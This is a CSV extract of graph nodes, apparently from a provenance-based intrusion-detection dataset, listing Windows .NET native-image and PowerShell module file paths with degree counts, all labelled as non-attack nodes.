uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
9122a9fe-8f82-49cb-ac06-ee737c750436,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\b544be25f624a3b9d2f98e8788f0acf8\\Microsoft.PowerShell.ConsoleHost.ni.dll.aux'},1655,False,10,0,10,10,0,10
2b4f78b1-a167-4646-a7cc-e13abec00dc1,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\65ad3055b627c2179fb80d620e7f835d\\System.Management.Automation.ni.dll.aux'},1657,False,10,0,10,10,0,10
83962e7e-a3a8-46db-9115-885bea69c014,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\b187b7f31cee3e87b56c8edca55324e0\\System.ni.dll.aux'},1660,False,10,0,10,10,0,10
9226d198-e337-4dc0-8871-f6df63245573,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\570b7aac439a9e98f47d508ba4ab1330\\System.Core.ni.dll.aux'},1662,False,10,0,10,10,0,10
9b34f9d5-0fa0-4262-b576-3bf35b621472,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\b79ea37bb757f47a2487170103f96214\\Microsoft.Management.Infrastructure.ni.dll.aux'},1665,False,10,0,10,10,0,10
a61d4d11-8842-4f74-a9c8-5519073c19a2,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\ce1e4670373608336100bea63bbc8990\\System.Numerics.ni.dll.aux'},1666,False,10,0,10,10,0,10
230d47b5-e1a4-41b2-aac8-0219bd9e9d22,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\db3df155ec9c0595b0198c4487f36ca1\\System.Xml.ni.dll.aux'},1667,False,10,0,10,10,0,10
2f018020-7969-49f0-afd7-caf27993ac19,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\e9e64b91c0e4559f01e50ac43ffb9a2a\\System.DirectoryServices.ni.dll.aux'},1668,False,10,0,10,10,0,10
c3e68a05-03a1-4fa3-891c-b03ce5180820,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\8af759007c012da690062882e06694f1\\System.Management.ni.dll.aux'},1670,False,10,0,10,10,0,10
1fe8447d-76aa-4387-876b-cb582beb7f19,{'file': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1'},1672,False,10,0,10,10,0,10
